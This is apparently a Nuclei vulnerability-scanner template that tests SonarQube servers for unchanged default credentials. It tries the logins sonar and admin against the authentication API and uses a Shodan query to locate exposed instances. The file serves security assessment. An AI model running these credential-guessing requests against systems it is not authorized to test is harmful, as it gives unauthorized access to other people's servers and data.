id: sonarqube-default-login

info:
  name: SonarQube 默认口令登录检测（弱口令）
  author: Ep1cSage
  severity: high
  description: |
    该模板通过尝试 SonarQube Default Login 的默认账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://docs.sonarsource.com/sonarqube/9.6/instance-administration/security/#:~:text=When%20installing%20SonarQube%2C%20a%20default,Password%3A%20admin
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
    cpe: cpe:2.3:a:sonarsource:sonarqube:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 4
    shodan-query: title:"Sonarqube"
    product: sonarqube
    vendor: sonarsource
  tags: default-login,sonarqube,vuln

http:
  - raw:
      - |
        POST /api/authentication/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        login={{username}}&password={{password}}

    attack: clusterbomb
    payloads:
      username:
        - sonar
        - admin
      password:
        - sonar
        - admin
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'len(body) == 0'
          - 'contains(set_cookie, "JWT-SESSION=")'
        condition: and
